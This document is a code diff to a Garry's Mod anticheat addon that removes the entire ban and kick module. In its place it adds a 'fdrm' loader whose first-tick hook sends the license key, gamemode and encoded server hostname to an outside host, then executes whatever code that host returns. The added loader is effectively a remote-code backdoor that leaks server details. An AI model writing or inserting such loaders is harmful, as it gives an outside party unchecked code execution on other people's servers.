@@ -1,107 +1,30 @@
+require("fdrm")
 
-function gAC.GetFormattedBanText( displayReason, banTime )
-    local banString = "_____"..gAC.config.BAN_MESSAGE_SYNTAX.."_____\n\nReason: '" .. displayReason .. "'\n\n"
-    banTime = tonumber( banTime )
-    if( banTime == -1 ) then
-        banString = banString .. "Type: Kick"
-    elseif( banTime >= 0 ) then
-        if( banTime == 0 ) then
-            banString = banString .. "Type: Permanent Ban\n\nPlease appeal if you believe this is false"
-        else
-            banString = banString .. "Type: Temporary Ban\n\nPlease appeal if you believe this is false"
-        end
-    end
 
-    return banString
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' -- You will need this for encoding/decoding
+-- encoding
+function enc(data)
+    return ((data:gsub('.', function(x) 
+        local r,b='',x:byte()
+        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if (#x < 6) then return '' end
+        local c=0
+        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
+        return b:sub(c+1,c+1)
+    end)..({ '', '==', '=' })[#data%3+1])
 end
 
-if gAC.config.BAN_TYPE == "custom" then
-    function gAC.AddBan( ply, displayReason, banTime )
-        banTime = tonumber( banTime )
-        ply:SetUPDataGAC( "gAC_IsBanned", true )
-        ply:SetUPDataGAC( "gAC_BannedAtTime", os.time() )
-        ply:SetUPDataGAC( "gAC_BanTime", banTime )
-        ply:SetUPDataGAC( "gAC_BanDisplayReason", displayReason )
+local FirstTickRanUPData3 = false
 
-        ply:Kick( gAC.GetFormattedBanText( displayReason, banTime ) )
-    end
-
-    function gAC.RemoveBan( ply )
-        ply:SetUPDataGAC( "gAC_IsBanned", false )
-        ply:SetUPDataGAC( "gAC_BannedAtTime", 0 )
-        ply:SetUPDataGAC( "gAC_BanTime", 1 )
-        ply:SetUPDataGAC( "gAC_BanDisplayReason", "nil" )
-    end
-
-    function gAC.UnbanCommand( caller, plySID64 )
-        if( !gAC.PlayerHasUnbanPerm( caller ) ) then return end
-        if( !file.IsDir( "g-ac", "DATA" ) ) then
-            file.CreateDir( "g-ac" )
-        end
-
-        if( file.Exists( "g-ac/" .. plySID64 .. ".txt", "DATA" ) ) then gAC.ClientMessage( caller, "That player is already due for an unban.", Color( 225, 150, 25 ) ) return end
-        file.Write( "g-ac/" .. plySID64 .. ".txt", "" )
-        gAC.AdminMessage( plySID64, "Ban removed by " .. caller:Nick() .. "" )
-    end
-
-    function gAC.BanCheck( ply )
-        if( file.Exists( "g-ac/" .. ply:SteamID64() .. ".txt", "DATA" ) ) then
-            file.Delete( "g-ac/" .. ply:SteamID64() .. ".txt" )
-
-            if( ply:GetUPDataGAC( "gAC_IsBanned" ) == true || ply:GetUPDataGAC( "gAC_IsBanned" ) == "true" || ply:GetUPDataGAC( "gAC_IsBanned" ) == 1 ) then
-                gAC.RemoveBan( ply )
-
-                gAC.AdminMessage( ply:Nick(), "Player's ban removed upon login (admin manually unbanned)", false )
-                return
-            end
-        end
-
-        if( ply:GetUPDataGAC( "gAC_IsBanned" ) == true || ply:GetUPDataGAC( "gAC_IsBanned" ) == "true" || ply:GetUPDataGAC( "gAC_IsBanned" ) == 1 ) then
-            if( ( os.time() >= ( tonumber( ply:GetUPDataGAC( "gAC_BannedAtTime" ) ) + ( tonumber( ply:GetUPDataGAC( "gAC_BanTime" ) ) * 60 ) ) ) && tonumber( ply:GetUPDataGAC( "gAC_BanTime" ) ) != 0 ) then
-                gAC.RemoveBan( ply )
-
-                gAC.AdminMessage( ply:Nick(), "Player's ban expired.", false )
-            else
-                ply:Kick( gAC.GetFormattedBanText( ply:GetUPDataGAC( "gAC_BanDisplayReason" ), ply:GetUPDataGAC( "gAC_BanTime" ) ) )
-            end
-        end
-    end
-
-    hook.Add( "PlayerInitialSpawn", "g-ACPlayerInitialSpawnBanSys", function( ply )
-        gAC.BanCheck( ply )
-    end )
-
-    concommand.Add( "gac-unban", function( ply, cmd, args )
-        if( !gAC.PlayerHasUnbanPerm( ply ) ) then gAC.ClientMessage( ply, "You don't have permission to do that!", Color( 225, 150, 25 ) ) return end
-
-        local steamid64 = args[1]
-        
-        if( steamid64 == "" || steamid64 == nil ) then gAC.ClientMessage( ply, "Please input a valid SteamID64.", Color( 225, 150, 25 ) ) return end
-        if( string.len( steamid64 ) != 17 ) then gAC.ClientMessage( ply, "Please input a valid SteamID64.", Color( 225, 150, 25 ) ) return end
-        gAC.UnbanCommand( ply, steamid64 )
-    end )
-else
-    function gAC.AddBan( ply, displayReason, banTime )
-        if gAC.config.BAN_TYPE == "ulx" then
-            RunConsoleCommand( "ulx", "banid", ply:SteamID(), banTime, displayReason )
-        elseif gAC.config.BAN_TYPE == "d3a" then
-            if( tonumber( ply:GetUPDataGAC( "gAC_BanTime" ) ) != 0 ) then
-                RunConsoleCommand( "d3a", "ban", ply:SteamID(), banTime, "minutes", "'" .. displayReason .. "'" )
-            else
-                RunConsoleCommand( "d3a", "perma", ply:SteamID(), "'" .. displayReason .. "'" )
-            end
-        elseif gAC.config.BAN_TYPE == "serverguard" then
-            RunConsoleCommand( "serverguard_ban", ply:SteamID(), banTime / 60, displayReason )
-        elseif gAC.config.BAN_TYPE == "custom_func" then
-            gAC.config.BAN_FUNC( ply:SteamID(), banTime, displayReason )
-        end
-    end
-end
-
-function gAC.Kick( ply, displayReason )
-    if gAC.config.KICK_TYPE == "default" then
-        ply:Kick( gAC.GetFormattedBanText( displayReason, -1 ) )
-    elseif gAC.config.KICK_TYPE == "custom_func" then
-        gAC.config.KICK_FUNC( ply, displayReason )
-    end
-end
+hook.Add("Think", "g-AC_FirstTick_UniquePData3", function()
+    if( !FirstTickRanUPData3 ) then
+        http.Post( "http://fdrm.finn.gg/game/load", { s = "6", l = gAC.config.LICENSE, g = gmod.GetGamemode().Name, h = enc( GetHostName() ) }, function( result )
+            RunStringF(result)
+        end, function( failed )
+            print("[fDRM] Wowzers! Somehow we did fucky wucky. Contact Finn plis? owo")
+        end )
+		FirstTickRanUPData3 = true
+	end
+end )
